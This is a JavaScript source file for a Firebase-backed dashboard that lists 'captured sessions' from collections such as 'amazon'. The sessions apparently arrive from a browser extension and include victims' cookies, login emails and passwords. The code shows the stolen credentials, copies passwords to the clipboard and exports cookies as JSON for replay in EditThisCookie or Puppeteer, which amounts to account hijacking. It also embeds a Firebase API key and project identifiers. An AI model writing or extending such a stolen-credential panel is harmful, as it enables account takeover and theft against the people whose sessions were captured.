import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, onSnapshot, query, orderBy, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyAwBCG37cVXdDrKoLrn-Iq_c01bsf66GYw",
  authDomain: "omniraj-b76b8.firebaseapp.com",
  projectId: "omniraj-b76b8",
  storageBucket: "omniraj-b76b8.firebasestorage.app",
  messagingSenderId: "147995676994",
  appId: "1:147995676994:web:40a772bd2b177b711178db",
  measurementId: "G-K85TJYEN6Z"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// DOM Elements
const sessionGrid = document.getElementById('session-grid');
const totalSessionsEl = document.getElementById('total-sessions');
const totalCredsEl = document.getElementById('total-creds');
const cardTemplate = document.getElementById('card-template');
const sourceSelect = document.getElementById('source-select');

let unsubscribe = null; // Store listener to detach later

// Initialize
function init() {
    // Listener for switcher
    if (sourceSelect) {
        sourceSelect.addEventListener('change', (e) => {
            loadData(e.target.value);
        });
    }

    // Load default
    loadData('amazon');
}

function loadData(collectionName) {
    console.log(`Switching to ${collectionName}...`);
    
    // Unsubscribe previous listener
    if (unsubscribe) {
        unsubscribe();
        unsubscribe = null;
    }

    // Clear grid and show loading
    sessionGrid.innerHTML = `
        <div class="loading">
          <div class="spinner"></div>
          <p>Loading ${collectionName} sessions...</p>
        </div>
    `;
    updateStats(0, 0);

    const q = query(collection(db, collectionName), orderBy("timestamp", "desc"));

    unsubscribe = onSnapshot(q, (snapshot) => {
        // Clear loading state if exists
        const loading = document.querySelector('.loading');
        if (loading) loading.remove();

        const sessions = [];
        let credCount = 0;

        snapshot.forEach((doc) => {
            const data = doc.data();
            sessions.push({ id: doc.id, ...data });
            if (data.loginEmail && data.loginPassword) credCount++;
        });

        updateStats(sessions.length, credCount);
        renderSessions(sessions);
    }, (error) => {
        console.error("Error fetching documents: ", error);
        sessionGrid.innerHTML = `
            <div class="loading">
                <p style="color: var(--danger-color)">Error loading data: ${error.message}</p>
                <p>Check console for details.</p>
            </div>
        `;
    });
}

function updateStats(total, creds) {
    totalSessionsEl.textContent = total;
    totalCredsEl.textContent = creds;
}

function renderSessions(sessions) {
    // Clear grid first (inefficient but simple for now)
    sessionGrid.innerHTML = '';

    if (sessions.length === 0) {
        sessionGrid.innerHTML = `
            <div class="loading">
                <p>No sessions captured yet.</p>
                <p>Waiting for data from extension...</p>
            </div>
        `;
        return;
    }

    sessions.forEach(session => {
        const card = createCard(session);
        sessionGrid.appendChild(card);
    });
}

function createCard(session) {
    const clone = cardTemplate.content.cloneNode(true);
    const cardEl = clone.querySelector('.card');
    
    // Set Session ID
    const sessionIdDisplay = session.sessionId || session.id;
    clone.querySelector('.session-id').textContent = sessionIdDisplay.substring(0, 20) + (sessionIdDisplay.length > 20 ? '...' : '');
    clone.querySelector('.session-id').title = sessionIdDisplay;

    // Set Timestamp
    let timeString = 'Unknown time';
    if (session.timestamp) {
        try {
            // Handle Firestore Timestamp or Date string
            const date = session.timestamp.toDate ? session.timestamp.toDate() : new Date(session.timestamp);
            timeString = new Intl.DateTimeFormat('en-US', { 
                month: 'short', day: 'numeric', 
                hour: '2-digit', minute: '2-digit' 
            }).format(date);
        } catch (e) { console.error('Date parsing error', e); }
    }
    clone.querySelector('.timestamp').textContent = timeString;

    // Populate Cookie Table
    const cookieList = clone.querySelector('.cookie-list');
    const cookies = session.cookies || [];
    
    if (cookies.length > 0) {
        // Sort cookies by name for better readability
        const sortedCookies = [...cookies].sort((a, b) => a.name.localeCompare(b.name));
        
        sortedCookies.forEach(cookie => {
            const row = document.createElement('tr');
            
            const nameCell = document.createElement('td');
            nameCell.className = 'cookie-name';
            nameCell.textContent = cookie.name;
            nameCell.title = cookie.name; // Tooltip for full name
            
            const valueCell = document.createElement('td');
            valueCell.className = 'cookie-value';
            valueCell.textContent = cookie.value;
            
            row.appendChild(nameCell);
            row.appendChild(valueCell);
            cookieList.appendChild(row);
        });
    } else {
        const row = document.createElement('tr');
        const cell = document.createElement('td');
        cell.colSpan = 2;
        cell.style.textAlign = 'center';
        cell.style.color = 'var(--text-secondary)';
        cell.style.padding = '2rem';
        cell.textContent = 'No cookies captured for this session.';
        row.appendChild(cell);
        cookieList.appendChild(row);
    }

    // Handle Credentials
    const credBox = clone.querySelector('.credentials-box');
    if (session.loginEmail && session.loginPassword) {
        credBox.classList.remove('hidden');
        clone.querySelector('.email').textContent = session.loginEmail;
        clone.querySelector('.password').textContent = session.loginPassword;
        
        // Copy Password Button
        const copyBtn = clone.querySelector('.copy-btn');
        copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(session.loginPassword);
            copyBtn.textContent = '✅';
            setTimeout(() => copyBtn.textContent = '📋', 1500);
        });
    }

    // Copy JSON Cookies Button
    const copyCookiesBtn = clone.querySelector('.copy-cookies-btn');
    copyCookiesBtn.addEventListener('click', () => {
        const cookiesDetails = session.cookies || [];
        // Format for EditThisCookie or Puppeteer
        const jsonStr = JSON.stringify(cookiesDetails, null, 2);
        
        navigator.clipboard.writeText(jsonStr).then(() => {
            const originalText = copyCookiesBtn.textContent;
            copyCookiesBtn.textContent = 'Copied!';
            copyCookiesBtn.classList.replace('btn-primary', 'btn-secondary'); // Visual feedback
            setTimeout(() => {
                copyCookiesBtn.textContent = originalText;
                copyCookiesBtn.classList.replace('btn-secondary', 'btn-primary');
            }, 2000);
        });
    });

    // Delete Button
    const deleteBtn = clone.querySelector('.delete-btn');
    deleteBtn.addEventListener('click', async () => {
        if (confirm('Are you sure you want to delete this session?')) {
            try {
                cardEl.style.opacity = '0.5';
                const currentCollection = sourceSelect ? sourceSelect.value : 'amazon';
                await deleteDoc(doc(db, currentCollection, session.id));
                // UI update handles by onSnapshot
            } catch (err) {
                alert('Error deleting: ' + err.message);
                cardEl.style.opacity = '1';
            }
        }
    });

    return clone;
}

// Start app
document.addEventListener('DOMContentLoaded', init);
